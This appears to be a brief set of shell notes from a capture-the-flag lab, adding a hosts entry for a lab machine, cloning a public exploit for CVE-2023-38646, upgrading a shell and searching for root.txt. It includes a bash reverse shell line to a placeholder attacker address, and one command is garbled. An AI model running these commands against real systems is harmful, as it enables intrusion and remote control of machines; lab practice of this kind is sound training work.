```shell

sudo echo '10.10.11.130 internal-administration.goodgames.htb '| sudo tee -a /etc/hosts



git clone https://github.com/securezeron/CVE-2023-38646
cd CVE-2023-38646
python3 -m pip install -r requirements.txtpyth



export TERM=linux
python3 -c "import pty; pty.spawn('/bin/bash')"

find 

cat $(find / -type f -name "root.txt" 2>/dev/null)



echo $shell
echo $PATH


bash -i >& /dev/tcp/TU_DIRECCION_IP/TU_PUERTO 0>&1
















```